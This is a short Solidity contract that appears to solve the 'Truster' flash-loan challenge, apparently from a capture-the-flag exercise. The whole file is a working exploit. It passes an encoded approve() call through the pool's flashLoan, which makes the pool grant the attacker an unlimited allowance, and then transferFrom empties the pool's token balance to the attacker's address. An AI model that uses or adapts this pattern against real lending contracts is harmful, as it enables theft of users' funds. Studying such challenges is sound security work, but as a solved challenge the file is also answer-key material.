pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

//@dev Interface of the pool to drain
interface LenderPool {
	function flashLoan(
		uint256 borrowAmount,
		address borrower,
		address target,
		bytes calldata data
	) external;
}


/*
@title Truster challenge solver
@dev TrusterLenderPool.flashLoan ignores the return value of target.functionCall. We can set our allowance over the pool to infinite.
*/
contract TrusterExploit {

	//@param_pool The lending pool to be drained
	//@param _DVT The tokens to be withdrawn
	//@attacker The attacking EOA
	/*@dev Call flashloan with a payload to set our allowance over the pool to 
	infinite. Then drain the pool.
       	*/ 
	function attack(LenderPool _pool, IERC20 _DVT, address attacker) 
		public
	{	
		bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
	      	_pool.flashLoan(0, attacker, address(_DVT), payload);
		_DVT.transferFrom(address(_pool), attacker, _DVT.balanceOf(address(_pool)));		
	}
}
